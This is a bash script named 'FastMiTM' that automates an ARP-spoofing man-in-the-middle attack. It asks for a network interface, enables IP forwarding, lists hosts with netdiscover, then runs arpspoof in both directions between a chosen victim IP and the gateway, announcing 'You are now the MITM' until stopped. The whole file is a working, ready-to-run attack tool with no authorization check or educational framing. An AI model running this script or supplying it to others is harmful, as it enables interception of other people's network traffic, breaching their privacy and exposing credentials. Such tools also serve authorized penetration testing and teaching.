#!/bin/bash

# Function to clean up and exit
cleanup_and_exit() {
    echo -e "\e[1;32mCleaning up...\e[0m"
    kill "$arpspoof_pid" 2>/dev/null  # Terminate arpspoof process
    sleep 3
    exit 0
}

# Trap Ctrl+C and call the cleanup function
trap cleanup_and_exit SIGINT

# Function to display headers
display_header() {
    echo -e "\e[1;31m$1\e[0m"
}

# Function to display messages
display_message() {
    echo -e "\e[1;34m$1\e[0m"
}

# Function to display errors
display_error() {
    echo -e "\e[1;91mError: $1\e[0m"
}

# Check if the script is run by the root user (EUID 0)
if [ "$EUID" -ne 0 ]; then
    display_error "This script must be run as the root user."
    exit 1
fi

# Check if required packages (dsniff, netdiscover, and figlet) are installed
if ! command -v dsniff &> /dev/null || ! command -v netdiscover &> /dev/null || ! command -v figlet &> /dev/null; then
    display_error "Required packages (dsniff, netdiscover, figlet) are not installed."
    display_message "Please run 'sudo ./setup.sh' to install the required packages and set up the environment."
    exit 1
fi

# Print "FastMiTM" in a large font with colors
display_header "$(figlet -f big "FastMiTM")"

# List all network interfaces
display_header "Available interfaces:"
ip link show | awk -F: '$0 !~ "lo|vir|wl|^[^0-9]"{print $2;getline}'

# Ask the user to select an interface
read -p "Enter the desired interface: " iface

# Check if the entered interface is valid
if ! ip link show | grep -q -w  "$iface"; then
    display_error "Invalid network interface '$iface'."
    exit 1
fi

# Get the network address of the selected interface
addr=$(ip addr show dev $iface | awk '/inet /{print $2}')

# Print the network address
display_message "Network address: $addr"
sleep 1
# Enable IP forwarding
display_message "Enabling IP forwarding ..."
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 1
# Check if enabling IP forwarding was successful
if [ $? -ne 0 ]; then
    display_error "Can't enable packet forwarding"
    exit 1
fi

# Run netdiscover to show available targets
display_message "Showing available targets with netdiscover .... (might take a while to complete)"
netdiscover -i $iface -r $addr -P

# Ask the user to enter the target IP address
read -p "Enter the target IP address: " target_ip

# Ask the user to enter the gateway IP address
read -p "Enter the gateway IP address (router): " gateway_ip

# Run arpspoof in the background
arpspoof -i $iface -r -t $target_ip $gateway_ip >/dev/null 2>&1 &
arpspoof_pid=$!

# Execute the following commands while arpspoof is running
display_message "Arp spoofing targets $target_ip & $gateway_ip in both directions ..."
sleep 5

# Check if arpspoof process is still running
if ! ps -p "$arpspoof_pid" > /dev/null; then
    display_error "Can't ARP host $target_ip. The arpspoof process terminated unexpectedly."
    exit 1
fi

display_header "You are now the"
display_header "$(figlet "|MITM|")"
display_message "(use Ctrl +c to stop the attack)"

while true; do
    sleep 1
done
